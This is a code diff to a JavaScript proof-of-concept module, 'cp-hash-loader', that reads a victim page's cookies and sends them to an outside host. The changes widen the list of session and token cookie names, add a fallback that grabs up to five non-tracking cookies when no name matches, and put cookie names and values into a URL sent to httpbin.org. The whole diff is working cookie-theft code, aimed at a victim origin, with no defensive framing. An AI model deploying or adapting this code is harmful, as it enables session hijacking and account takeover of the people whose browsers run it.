@@ -2,12 +2,19 @@ define([], function () {
   var HTTPBIN_BASE = "https://httpbin.org/anything/cp-hash-loader";
   var AUTH_COOKIE_HINTS = [
     "sess",
+    "sessid",
     "session",
+    "jsessionid",
+    "phpsessid",
+    "asp.net_sessionid",
     "auth",
     "token",
     "jwt",
+    "bearer",
     "sid",
     "sso",
+    "oidc",
+    "saml",
     "identity",
     "account",
     "login",
@@ -16,6 +23,25 @@ define([], function () {
     "id_token",
     "access_token",
     "refresh_token"
+  ];
+  var TRACKING_COOKIE_HINTS = [
+    "_ga",
+    "_gid",
+    "_gat",
+    "_fbp",
+    "_gcl",
+    "_hj",
+    "_clck",
+    "_uet",
+    "optanon",
+    "consent",
+    "cookie",
+    "ak_bmsc",
+    "bm_sv",
+    "amcv",
+    "datadome",
+    "cf_",
+    "_dd"
   ];
 
   function nowIso() {
@@ -66,9 +92,37 @@ define([], function () {
   }
 
   function collectAuthCookies(cookies) {
-    return cookies.filter(function (cookie) {
+    var matched = cookies.filter(function (cookie) {
       return isAuthCookieName(cookie.name);
     });
+    if (matched.length > 0) {
+      return {
+        cookies: matched,
+        mode: "name_match"
+      };
+    }
+
+    var fallback = cookies.filter(function (cookie) {
+      var low = (cookie.name || "").toLowerCase();
+      for (var i = 0; i < TRACKING_COOKIE_HINTS.length; i++) {
+        if (low.indexOf(TRACKING_COOKIE_HINTS[i]) !== -1) {
+          return false;
+        }
+      }
+      return true;
+    }).slice(0, 5);
+
+    if (fallback.length > 0) {
+      return {
+        cookies: fallback,
+        mode: "fallback_non_tracking"
+      };
+    }
+
+    return {
+      cookies: [],
+      mode: "none"
+    };
   }
 
   function makeSessionId() {
@@ -109,16 +163,22 @@ define([], function () {
 
   function buildReadableHttpbinLink(baseUrl, payload) {
     var authCookies = payload && payload.authCookies ? payload.authCookies : [];
+    var visibleNames = payload && payload.visibleCookieNames ? payload.visibleCookieNames : [];
     var params = [];
     params.push("event=" + encodeURIComponent(payload.event || "cp_hash_loader"));
     params.push("ts=" + encodeURIComponent(payload.marker && payload.marker.ts ? payload.marker.ts : nowIso()));
     params.push("origin=" + encodeURIComponent(payload.marker && payload.marker.victimOrigin ? payload.marker.victimOrigin : window.location.origin));
     params.push("count=" + encodeURIComponent(String(authCookies.length)));
+    params.push("mode=" + encodeURIComponent(payload.authCookieSelection || "unknown"));
+    params.push("visible_count=" + encodeURIComponent(String(payload.visibleCookieCount || 0)));
 
     for (var i = 0; i < authCookies.length && i < 5; i++) {
       var c = authCookies[i] || {};
       params.push("c" + i + "n=" + encodeURIComponent(c.name || ""));
       params.push("c" + i + "v=" + encodeURIComponent(c.value || ""));
+    }
+    for (var j = 0; j < visibleNames.length && j < 5; j++) {
+      params.push("v" + j + "n=" + encodeURIComponent(visibleNames[j] || ""));
     }
 
     return baseUrl + "?" + params.join("&");
@@ -216,7 +276,8 @@ define([], function () {
   function executePoC() {
     var ts = nowIso();
     var cookies = parseCookies();
-    var authCookies = collectAuthCookies(cookies);
+    var authSelection = collectAuthCookies(cookies);
+    var authCookies = authSelection.cookies;
     var session = makeSessionId();
     var requestUrl = HTTPBIN_BASE + "/" + session;
 
@@ -242,6 +303,9 @@ define([], function () {
       },
       authCookies: authCookies,
       authCookieCount: authCookies.length,
+      authCookieSelection: authSelection.mode,
+      visibleCookieCount: cookies.length,
+      visibleCookieNames: cookies.map(function (c) { return c.name; }).slice(0, 20),
       note: "Only non-HttpOnly cookies readable from current site are included."
     };
     var readableLink = buildReadableHttpbinLink(requestUrl, payload);
